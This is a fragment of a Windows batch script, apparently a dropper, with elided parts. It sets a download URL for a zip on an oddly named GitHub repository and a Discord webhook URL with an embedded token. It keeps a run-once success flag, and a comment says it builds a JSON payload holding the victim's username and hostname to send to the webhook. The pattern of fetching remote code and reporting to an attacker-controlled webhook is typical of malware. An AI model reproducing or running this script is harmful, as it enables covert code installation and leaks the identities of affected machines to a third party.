...
:: Configuration
set "DOWNLOAD_URL=https://github.com/Littlesdfhdfd/dannyg445/raw/refs/heads/main/coxyi3.zip"
...
set "DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1423396463488012488/NeNMUsDa7npFtKfHrOG6fq9NzPmonInNnDq4gHq-OHyG1OGvOUXzwyf8sGlJaGJhVs6a"
...
if exist "%SUCCESS_FLAG%" (
    ...
    call :SendWebhook "ScriptHelper Already Completed" "Script attempted to run but has already completed successfully on this machine." "16753920"
    exit /b 0
)
...
:: Create JSON payload with username and hostname
